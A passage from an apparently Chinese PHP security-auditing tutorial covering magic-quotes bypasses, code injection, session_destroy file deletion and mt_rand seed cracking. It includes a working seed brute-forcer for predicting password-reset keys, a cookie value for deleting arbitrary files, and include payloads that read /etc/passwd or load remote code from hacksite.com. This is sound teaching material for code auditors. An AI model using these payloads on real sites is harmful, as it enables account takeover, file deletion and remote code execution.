)</span></div></pre></td></tr></table></figure><p>数组第一维变量的key不受魔术引号的影响。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4和php&lt;5.2.1</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><p><em>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa<span class="string">'aaa</span></div><div class="line">bb'b</div></pre></td></tr></table></figure><p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></div><div class="line"><span class="comment">//magic_quotes_gpc = Off</span></div><div class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line"> $_GET  = addslashes_array($_GET);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</div><div class="line">&#125;</div><div class="line">print_R($_GET);</div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line"><span class="keyword">print</span> $key;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Array</span></div><div class="line">(</div><div class="line">    [aaa<span class="string">'aa] =&gt; 1\'</span></div><div class="line">)</div><div class="line">aaa'aa</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="代码注射"><a href="#代码注射" class="headerlink" title="代码注射"></a>代码注射</h3><hr><h3 id="PHP中可能导致代码注射的函数"><a href="#PHP中可能导致代码注射的函数" class="headerlink" title="PHP中可能导致代码注射的函数"></a>PHP中可能导致代码注射的函数</h3><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p><table><thead><tr><th style="text-align:left">函数</th></tr></thead><tbody><tr><td style="text-align:left">assert()</td></tr><tr><td style="text-align:left">call_user_func()</td></tr><tr><td style="text-align:left">call_user_func_array()</td></tr><tr><td style="text-align:left">create_function()</td></tr><tr><td style="text-align:left">变量函数</td></tr></tbody></table><p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//how to exp this code</span></div><div class="line">$sort_by=$_GET[<span class="string">'sort_by'</span>];</div><div class="line">$sorter=<span class="string">'strnatcasecmp'</span>;</div><div class="line">$databases=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</div><div class="line">$sort_function = <span class="string">'  return 1 * '</span> . $sorter . <span class="string">'($a["'</span> . $sort_by . <span class="string">'"], $b["'</span> . $sort_by . <span class="string">'"]);</span></div><div class="line">      ';</div><div class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）</td></tr></tbody></table><h3 id="变量函数与双引号"><a href="#变量函数与双引号" class="headerlink" title="变量函数与双引号"></a>变量函数与双引号</h3><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> <span class="string">"$a\n"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'$a\n'</span>;</div></pre></td></tr></table></figure><p>我们再看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//how to exp this code</span></div><div class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</div><div class="line"></div><div class="line">$text = preg_replace(</div><div class="line"><span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</div><div class="line"><span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</div><div class="line"><span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</div><div class="line"><span class="string">'check_email("$1", "$1")'</span>), $text);</div></pre></td></tr></table></figure><p>另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="PHP自身函数漏洞及缺陷"><a href="#PHP自身函数漏洞及缺陷" class="headerlink" title="PHP自身函数漏洞及缺陷"></a>PHP自身函数漏洞及缺陷</h3><hr><h3 id="PHP函数的溢出漏洞"><a href="#PHP函数的溢出漏洞" class="headerlink" title="PHP函数的溢出漏洞"></a>PHP函数的溢出漏洞</h3><p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . <span class="string">'_data'</span>]);</div></pre></td></tr></table></figure><p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：对应fix的版本</td></tr><tr><td style="text-align:left">系统要求：</td></tr><tr><td style="text-align:left">审计策略：查找对应函数名</td></tr></tbody></table><h3 id="PHP函数的其他漏洞"><a href="#PHP函数的其他漏洞" class="headerlink" title="PHP函数的其他漏洞"></a>PHP函数的其他漏洞</h3><p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability<br>​<br>比如phpwind早期的serarch.php里的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unset</span>($uids);</div><div class="line">......</div><div class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</div><div class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</div><div class="line">$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</div><div class="line">&#125;</div><div class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</div><div class="line">........</div><div class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.3 php5&lt;5.14</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找unset</td></tr></tbody></table><h3 id="session-destroy-删除文件漏洞"><a href="#session-destroy-删除文件漏洞" class="headerlink" title="session_destroy()删除文件漏洞"></a>session_destroy()删除文件漏洞</h3><p><em>测试PHP版本：5.1.2</em><br>​<br>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//val.php   </span></div><div class="line">session_save_path(<span class="string">'./'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</div><div class="line">session_unset();</div><div class="line">session_destroy();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</div><div class="line"><span class="keyword">echo</span>(session_id());</div><div class="line">print_r($_SESSION);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess<code>_</code>/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：具体不详</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找session_destroy</td></tr></tbody></table><h3 id="随机函数"><a href="#随机函数" class="headerlink" title="随机函数"></a>随机函数</h3><p><em>1) rand() VS mt_rand()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//on windows</span></div><div class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></div><div class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a= md5(rand());</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">32767</span>;$i++)&#123;</div><div class="line">  <span class="keyword">if</span>(md5($i) ==$a ) &#123;</div><div class="line">   <span class="keyword">print</span> $i.<span class="string">"--&gt;ok!! |</span></div><div class="line">| ";<span class="keyword">exit</span>;</div><div class="line">   &#125;<span class="keyword">else</span> &#123; <span class="keyword">print</span> $i.<span class="string">" |</span></div><div class="line">| ";&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找rand</td></tr></tbody></table><p><em>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</em></p><p>看php手册里的描述：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mt_srand</div><div class="line">(PHP <span class="number">3</span> &gt;= <span class="number">3.0</span><span class="number">.6</span>, PHP <span class="number">4</span>, PHP <span class="number">5</span>)</div><div class="line"></div><div class="line">mt_srand -- 播下一个更好的随机数发生器种子</div><div class="line">说明</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mt_srand</span> <span class="params">( <span class="keyword">int</span> seed )</span></span></div></pre></td></tr></table></figure><p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 </p><p>例子 1. mt_srand() 范例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// seed with microseconds</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</div><div class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</div><div class="line">&#125;</div><div class="line">mt_srand(make_seed());</div><div class="line">$randval = mt_rand();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt<em>srand() 函数给随机数发生器播种，现已自动完成。</em></p><p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mt_srand ((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>)</div></pre></td></tr></table></figure><p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()&lt;<span class="number">1</span> ---&gt; <span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()* <span class="number">1000000</span>&lt;<span class="number">1000000</span></div></pre></td></tr></table></figure><p>那么很容易暴力破解,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/////////////////</span></div><div class="line"><span class="comment">//&gt;php rand.php</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">////////////////</span></div><div class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</div><div class="line">$time=(double) microtime()* <span class="number">1000000</span>;</div><div class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</div><div class="line">mt_srand ($time);</div><div class="line"></div><div class="line">$search_id = mt_rand();</div><div class="line">$seed = search_seed($search_id);</div><div class="line"><span class="keyword">print</span> $seed;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</div><div class="line">$max = <span class="number">1000000</span>;</div><div class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</div><div class="line">mt_srand($seed);</div><div class="line">$key = mt_rand();</div><div class="line"><span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p><table><thead><tr><th style="text-align:left">例A</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-A</em></td></tr><tr><td style="text-align:left">mt_rand-A-1</td></tr><tr><td style="text-align:left">mt_rand-A-2</td></tr><tr><td style="text-align:left">mt_rand-A-3</td></tr></tbody></table><table><thead><tr><th style="text-align:left">例B</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-B</em></td></tr><tr><td style="text-align:left">mt_rand-B-1</td></tr><tr><td style="text-align:left">mt_rand-B-2</td></tr><tr><td style="text-align:left">mt_rand-B-3</td></tr></tbody></table><p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p><p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p><p>第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p><p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：<br>The Implementation</p><blockquote><p>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p></blockquote><p>在32位系统上默认的播种的种子为最大值是<code>2^32</code>，这样我们循环最多<code>2^32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">4</span>); </div><div class="line">$a = mt_rand(); </div><div class="line">mt_srand(<span class="number">5</span>); </div><div class="line">$b = mt_rand();</div><div class="line"><span class="keyword">print</span> $a.<span class="string">"\n"</span>.$b;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//base on http://www.milw0rm.com/exploits/6421 </span></div><div class="line"><span class="comment">//test on php 5.2.0</span></div><div class="line"></div><div class="line">define(<span class="string">'BUGGY'</span>, <span class="number">1</span>); <span class="comment">//上面代码$a==$b时候定义BUGGY=1</span></div><div class="line"></div><div class="line">$key = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</div><div class="line">$seed = getseed($key);</div><div class="line"><span class="keyword">print</span> $seed.<span class="string">"\n"</span>; </div><div class="line"></div><div class="line">mt_srand($seed);</div><div class="line">$pass = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $pass.<span class="string">"\n"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</div><div class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</div><div class="line"><span class="keyword">if</span> ( $special_chars )</div><div class="line">$chars .= <span class="string">'!@#$%^&amp;*()'</span>;</div><div class="line"></div><div class="line">$password = <span class="string">''</span>;</div><div class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</div><div class="line">$password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</div><div class="line"><span class="keyword">return</span> $password;</div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getseed</span><span class="params">($resetkey)</span> </span>&#123;</div><div class="line">$max = pow(<span class="number">2</span>,(<span class="number">32</span>-BUGGY));</div><div class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;=$max;$x++) &#123;</div><div class="line">$seed = BUGGY ? ($x &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> : $x; </div><div class="line">mt_srand($seed);</div><div class="line">$testkey = wp_generate_password(<span class="number">20</span>,<span class="keyword">false</span>);</div><div class="line"><span class="keyword">if</span>($testkey==$resetkey) &#123; <span class="keyword">echo</span> <span class="string">"o\n"</span>; <span class="keyword">return</span> $seed; &#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!($x % <span class="number">10000</span>)) <span class="keyword">echo</span> $x / <span class="number">10000</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">php5&gt;php rand.php</div><div class="line">M8pzpjwCrvVt3oobAaOr</div><div class="line">0123456789101112131415161718192021222324252627282930313233343536373839404142434</div><div class="line">445464748495051525354555657585960616263646566676869</div><div class="line">7071727374757677787980818283848586878889909192939495969798991001011021031041051</div><div class="line">061071081091101111121131141151161171181191201211221</div><div class="line">2312412512612712812913013113213313413513613713813914014114214314414514614714814</div><div class="line">915015115215315415515615715815916016116216316416516</div><div class="line">6167168169170171172173174175176177178179180181182183184185186187188189190191192</div><div class="line">193194195196197198199200201202203204205206207208209</div><div class="line">2102112122132142152162172182192202212222232242252262272282292302312322332342352</div><div class="line">362372382392402412422432442452462472482492502512522</div><div class="line">..............01062110622106231062410625106261062710628106291063010631106321063</div><div class="line">3o</div><div class="line">70693</div><div class="line">pjwCrvVt3oobAaOr</div></pre></td></tr></table></figure><p>当10634次时候我们得到了结果。</p><p>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">42</span>);</div><div class="line"><span class="keyword">echo</span> mt_rand();</div><div class="line"><span class="comment">//php&lt;=5.20 1387371436</span></div><div class="line"><span class="comment">//php&gt;5.20 1354439493 </span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。</p><p>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。</p><p>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找mt_srand/mt_rand</td></tr></tbody></table><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><hr><p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：</p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>其中最有名的数大家都熟悉的null字符截断。</p><h4 id="include截断"><a href="#include截断" class="headerlink" title="include截断"></a>include截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>].<span class="string">".php"</span>; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code>http://www.hacksite.com/evil-code.txt</code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">////////////////////</span></div><div class="line"><span class="comment">////var5.php代码:</span></div><div class="line"><span class="comment">////include $_GET['action'].".php"; </span></div><div class="line"><span class="comment">////print strlen(realpath("./"))+strlen($_GET['action']);  </span></div><div class="line"><span class="comment">///////////////////</span></div><div class="line">ini_set(<span class="string">'max_execution_time'</span>, <span class="number">0</span>);</div><div class="line">$str=<span class="string">''</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50000</span>;$i++)</div><div class="line">&#123;</div><div class="line">$str=$str.<span class="string">"/"</span>;</div><div class="line"></div><div class="line">$resp=file_get_contents(<span class="string">'http://127.0.0.1/var/var5.php?action=1.txt'</span>.$str);</div><div class="line"><span class="comment">//1.txt里的代码为print 'hi';</span></div><div class="line"><span class="keyword">if</span> (strpos($resp, <span class="string">'hi'</span>) !== <span class="keyword">false</span>)&#123;</div><div class="line"><span class="keyword">print</span> $i;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code>*</code>nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($<code>_</code>GET<code>[&#39;action&#39;]</code>)的长度大于256时被截断，对于<code>*</code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）</p><h4 id="数据截断"><a href="#数据截断" class="headerlink" 